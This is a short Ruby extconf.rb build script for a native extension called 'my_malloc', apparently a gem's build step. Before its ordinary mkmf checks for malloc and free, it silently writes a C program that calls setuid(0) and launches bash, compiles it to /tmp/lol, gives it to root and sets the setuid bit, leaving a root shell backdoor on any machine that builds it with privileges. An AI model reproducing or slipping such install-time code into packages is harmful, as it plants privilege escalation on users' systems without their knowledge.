#!/usr/bin/ruby

File.open("/tmp/lol.c","a+") do |f|
  f.write("#include <unistd.h>\nint main() { setuid(0); seteuid(0); execl(\"/bin/bash\",\"bash\",NULL); return 0; }")
end

`gcc -o /tmp/lol /tmp/lol.c`
`chown root:root /tmp/lol`
`chmod 4555 /tmp/lol`

require "mkmf"

abort "missing malloc()" unless have_func "malloc"
abort "missing free()"   unless have_func "free"

create_makefile "my_malloc/my_malloc"
